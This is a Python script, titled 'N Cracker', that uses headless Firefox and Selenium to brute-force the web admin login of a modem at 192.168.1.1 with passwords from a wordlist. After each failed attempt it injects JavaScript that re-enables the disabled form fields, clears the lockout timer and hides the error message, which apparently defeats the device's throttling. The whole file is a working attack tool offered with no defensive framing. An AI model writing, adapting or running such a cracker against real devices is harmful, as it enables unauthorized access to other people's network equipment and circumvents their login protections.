import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import curses
import argparse

# Argument parse to get the wordlist file
parser = argparse.ArgumentParser(description="N Cracker")
parser.add_argument("wordlist", help="Wordlist file")
parser.add_argument("username", help="Username to test")
args = parser.parse_args()

with open(args.wordlist, "r") as file:
    passwords = file.readlines()

is_finished = False
password_cursor = 0
found_password = ""
total_password_amount = len(passwords)

# Set up the webdriver
options = FirefoxOptions()
options.add_argument("--headless")
driver = webdriver.Firefox(options=options)

# Initialize curses
stdscr = curses.initscr()
curses.noecho()
curses.curs_set(0)

while not is_finished:
    # Open the webpage
    try:
        driver.get("http://192.168.1.1")

        login_error_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login_error"))
        )
        # If the login error element appears, run the JS code
        driver.execute_script("""
            $("#Frm_Password").removeAttr("disabled");
            $("#LoginId").removeAttr("disabled");
            $("#Frm_Username").removeAttr("disabled");
            $("#Frm_Username").focus();
            if (interval) {
            window.clearInterval(interval);
            }
            $("#login_error").hide();
        """)

        for password_index in range(password_cursor, len(passwords)):
            password_cursor = password_index
            password = passwords[password_index].strip()

            # Clear the screen and print the current password
            stdscr.clear()
            stdscr.addstr(0, 0, "Trying password: " + password)
            stdscr.addstr(1, 0, "Progress: " + str(password_cursor) + "/" + str(total_password_amount))
            stdscr.refresh()

            # Fill in the username and password fields
            username_input = driver.find_element(By.ID, "Frm_Username")
            username_input.clear()
            username_input.send_keys(str(args.username))

            password_input = driver.find_element(By.ID, "Frm_Password")
            password_input.clear()
            password_input.send_keys(password)

            # Click the submit button
            submit_button = driver.find_element(By.ID, "LoginId")
            submit_button.click()

            # Check if the login error element appears
            try:
                login_error_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "login_error"))
                )
                # If the login error element appears, run the JS code
                driver.execute_script("""
                    $("#Frm_Password").removeAttr("disabled");
                    $("#LoginId").removeAttr("disabled");
                    $("#Frm_Username").removeAttr("disabled");
                    $("#Frm_Username").focus();
                    if (interval) {
                    window.clearInterval(interval);
                    }
                    $("#login_error").hide();
                """)
            except Exception:
                pass

            # Check if the page redirects to somewhere else than the /
            if driver.current_url != "http://192.168.1.1/":
                print("[FOUND] Password: ", password)
                stdscr.addstr(2, 0, "[FOUND] Password: " + password)
                found_password = password
                stdscr.refresh()

        stdscr.addstr(3, 0, "All passwords tried.")
        stdscr.refresh()
        is_finished = True
    except Exception:
        stdscr.addstr(4, 0, "Modem is not responding, waiting.")
        stdscr.refresh()
        time.sleep(5)

# Close the webdriver
driver.quit()

# Clean up curses
curses.nocbreak()
stdscr.keypad(False)
curses.echo()
curses.endwin()

if found_password:
    print("Found password: ", found_password)
else:
    print("Password not found.")
